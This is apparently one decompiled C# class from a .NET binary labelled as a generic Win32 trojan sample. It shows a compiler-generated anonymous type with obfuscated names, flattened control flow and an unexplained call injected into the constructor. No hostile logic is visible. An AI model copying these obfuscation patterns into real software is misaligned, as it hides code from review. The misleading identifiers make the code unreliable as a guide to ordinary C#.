// Decompiled with JetBrains decompiler
// Type: ProjNet.Structs.EventTokenStructBuilder`2
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using TYPELIBA.Identifiers;

namespace ProjNet.Structs
{
  [DebuggerDisplay("\\{ <>h__TransparentIdentifier0 = {<>h__TransparentIdentifier0}, titles = {titles} }", Type = "<Anonymous Type>")]
  [CompilerGenerated]
  internal sealed class EventTokenStructBuilder<T, TT>
  {
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    private readonly T m_Connection;
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    private readonly TT m_Parser;

    public T \u003C\u003Eh__TransparentIdentifier0
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Connection;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public TT DisableObject() => this.m_Parser;

    [DebuggerHidden]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public EventTokenStructBuilder(T reference, TT vis)
    {
      ManagerParamsID.NewExpression();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      // ISSUE: reference to a compiler-generated field
      this.m_Connection = reference;
      // ISSUE: reference to a compiler-generated field
      this.m_Parser = vis;
    }

    [DebuggerHidden]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public override bool Equals(object reference)
    {
      int num = 4;
      // ISSUE: variable of a compiler-generated type
      EventTokenStructBuilder<T, TT> tokenStructBuilder;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            if (tokenStructBuilder != null && EqualityComparer<T>.Default.Equals(this.m_Connection, tokenStructBuilder.m_Connection))
            {
              num = 5;
              continue;
            }
            goto label_8;
          case 1:
          case 3:
            if (this == tokenStructBuilder)
              goto label_9;
            else
              goto case 0;
          case 4:
            tokenStructBuilder = reference as EventTokenStructBuilder<T, TT>;
            num = 3;
            continue;
          case 5:
            goto label_7;
          default:
            num = 0;
            continue;
        }
      }
label_7:
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      return EqualityComparer<TT>.Default.Equals(this.m_Parser, tokenStructBuilder.m_Parser);
label_8:
      return false;
label_9:
      return true;
    }

    [DebuggerHidden]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public override int GetHashCode() => (-576096312 * -1521134295 + EqualityComparer<T>.Default.GetHashCode(this.m_Connection)) * -1521134295 + EqualityComparer<TT>.Default.GetHashCode(this.m_Parser);

    [DebuggerHidden]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public override string ToString()
    {
      object[] objArray = new object[2];
      // ISSUE: reference to a compiler-generated field
      T connection = this.m_Connection;
      ref T local1 = ref connection;
      objArray[0] = (object) ((object) local1 != null ? local1.ToString() : (string) null);
      // ISSUE: reference to a compiler-generated field
      TT parser = this.m_Parser;
      ref TT local2 = ref parser;
      objArray[1] = (object) ((object) local2 != null ? local2.ToString() : (string) null);
      return string.Format((IFormatProvider) null, "{{ <>h__TransparentIdentifier0 = {0}, titles = {1} }}", objArray);
    }

    internal static bool ReflectDispatcher() => true;

    internal static bool PrepareDispatcher() => false;
  }
}
